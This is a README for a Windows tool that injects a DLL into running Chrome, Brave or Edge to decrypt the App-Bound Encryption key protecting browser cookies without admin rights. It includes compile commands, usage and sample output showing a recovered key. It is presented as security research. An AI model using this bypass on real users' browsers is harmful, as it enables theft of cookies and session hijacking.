# Chrome App-Bound Encryption Decryption

> **Purpose**  
> Decrypt the **App‑Bound Encrypted (ABE)** keys stored in the *Local State* file of Chromium‑based browsers (**Chrome, Brave, Edge**) **without requiring administrative privileges**.

Starting with Chrome 127, Google introduced ABE: cookies (and, in future, passwords & payment data) are encrypted with a key that can only be decrypted by the browser’s own **IElevator** COM service *and* when the calling binary is inside the browser’s installation directory.  

This project bypasses the path‑validation requirement by **injecting a DLL into the running browser process (CreateRemoteThread + LoadLibrary)** and calling IElevator from there.

## Supported & Tested Versions

| Browser | Tested Version (x64 & ARM64) |
|---------|-----------------------------|
| **Google Chrome** | 135.0.7049.96 |
| **Brave** | 1.77.100 |
| **Microsoft Edge** | 135.0.3179.85 |

> [!NOTE]  
> The injector requires the target browser to be **running**.


## Build Instructions

1. **Clone** the repository and open a *Developer Command Prompt for VS* (or any MSVC‑enabled shell).  
2. **Compile the DLL** (responsible for the decryption logic):

    ```bash
    cl /EHsc /LD /O2 /MT chrome_decrypt.cpp ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
    ```
3. **Compile the injector** (responsible for DLL injection & console UX):

    ```bash
    cl /EHsc /O2 /MT chrome_inject.cpp ole32.lib shell32.lib version.lib /link /OUT:chrome_inject.exe
    ```

Both artifacts (`chrome_inject.exe`, `chrome_decrypt.dll`) must reside in the same folder.

## Usage

```bash
PS chrome_inject.exe <browser>
```

### Example

```bash
PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> chrome_inject.exe chrome
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  CreateRemoteThread + LoadLibrary Injection  |
|  v0.3 by @xaitax                             |
------------------------------------------------

[*] Located Chrome with PID 16044
[+] Chrome Version: 135.0.7049.96
[+] DLL injected.
[*] Starting Chrome App-Bound Encryption Decryption process.
[+] COM library initialized.
[+] IElevator instance created successfully.
[+] Proxy blanket set successfully.
[+] Retrieving AppData path.
[+] Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[+] Base64 key extracted.
[+] Finished decoding.
[+] Key header is valid.
[+] Encrypted key retrieved: 01000000d08c9ddf0115d1118c7a00c04fc297eb...
[+] BSTR allocated for encrypted key.
[+] Decryption successful.

[+] Decrypted Key: 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
```

Further Links:

- [Google Security Blog](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)
- [snovvcrash](https://x.com/snovvcrash)
- [SilentDev33](https://github.com/SilentDev33/ChromeAppBound-key-injection)

## Disclaimer

> [!WARNING]  
> This tool is intended for cybersecurity research and educational purposes. Ensure compliance with all relevant legal and ethical guidelines when using this tool.